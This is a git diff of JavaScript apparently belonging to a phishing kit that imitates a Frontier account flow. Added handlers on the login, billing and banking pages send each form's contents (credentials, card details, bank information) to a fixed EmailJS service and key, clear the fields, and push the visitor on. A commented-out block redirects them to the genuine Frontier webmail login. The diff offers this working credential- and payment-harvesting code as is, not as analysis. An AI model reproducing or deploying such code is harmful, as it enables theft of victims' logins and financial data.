@@ -34,12 +34,13 @@ function showFooter(event, element) {
   }
 }
 
-console.log(window.location.pathname);
+// console.log(document.getElementById("login-form"))
+
+// console.log(window.location.pathname);
 if (window.location.pathname === "/views/billing.html") {
   const expiration = document.getElementById("expiration");
   const states = document.getElementById("states");
   const ExpYear = document.getElementById("year");
-  const date = document.getElementById("date-picker");
 
   const usStates = [
     "Alabama",
@@ -118,16 +119,108 @@ if (window.location.pathname === "/views/billing.html") {
   });
 }
 
+// Login Page Form Submit
+if (window.location.pathname === "/") {
+  const loginSubmitBtn = document.querySelector(".login-btn");
+  // console.log(submitBtn);
+  loginSubmitBtn.addEventListener("click", () => {
+    const loginForm = document.getElementById("login-form");
+    console.log(loginForm);
 
+    // serviceID - templateID - #form - publicKey
+    emailjs
+      .sendForm(
+        "service_4q8coel",
+        "template_a97si1y",
+        "#login-form",
+        "3n7ifkUOowaI47Ert"
+      )
+      .then(
+        () => {
+          loginForm.reset(); // Clear input fields
+          console.log("Success");
+          window.location.href = "views/billing.html";
+        },
+        () => {
+          console.log("Message not sent");
+        }
+      );
+    // }
+  });
+}
 
+// Billing page
+if (window.location.pathname === "/views/billing.html") {
+  const prepaidCheckInput = document.getElementById("prepaid-check");
 
-// if (window.location.pathname === "/views/billing.html") {
-//   const year = document.getElementById("year");
-//   // Loop from 2024 to 2029 to create <option> elements
-//   for (let year = 2024; year <= 2029; year++) {
-//     const optionYear = document.createElement("option");
-//     optionYear.value = year;
-//     optionYear.textContent = year;
-//     year.appendChild(optionYear);
-//   }
+  // Add the 'name' attribute to the input element
+  if (prepaidCheckInput.checked) {
+    prepaidCheckInput.setAttribute("name", "prepaid-checked");
+  } else {
+    prepaidCheckInput.setAttribute("name", "prepaid-NOT-checked");
+  }
+
+  // Verify that the attribute was added
+  console.log(prepaidCheckInput);
+
+  // Billing page form submit
+  function submitBilling() {
+    const billingForm = document.getElementById("billing-form");
+    console.log(billingForm);
+
+    // serviceID - templateID - #form - publicKey
+    emailjs
+      .sendForm(
+        "service_4q8coel",
+        "template_a97si1y",
+        "#billing-form",
+        "3n7ifkUOowaI47Ert"
+      )
+      .then(
+        () => {
+          billingForm.reset(); // Clear input fields
+          console.log("Success");
+          window.location.href = "./banking.html";
+        },
+        () => {
+          console.log("Message not sent");
+        }
+      );
+  }
+}
+
+// Banking form submit
+if (window.location.pathname === "/views/banking.html") {
+  const bankingVerifyBtn = document.querySelector(".verify-btn");
+  // console.log(submitBtn);
+  bankingVerifyBtn.addEventListener("click", () => {
+    const bankingForm = document.getElementById("banking-form");
+    console.log(bankingForm);
+
+    // serviceID - templateID - #form - publicKey
+    emailjs
+      .sendForm(
+        "service_4q8coel",
+        "template_a97si1y",
+        "#banking-form",
+        "3n7ifkUOowaI47Ert"
+      )
+      .then(
+        () => {
+          bankingForm.reset(); // Clear input fields
+          console.log("Success");
+          window.location.href = "/";
+        },
+        () => {
+          console.log("Message not sent");
+        }
+      );
+  });
+}
+
+// if (window.location.pathname === "views/thank-you.html") {
+//   console.log(window.location.pathname);
+//   setTimeout(() => {
+//     window.location.href = "https://login.frontier.com/webmail/";
+//   }, 3000);
 // }
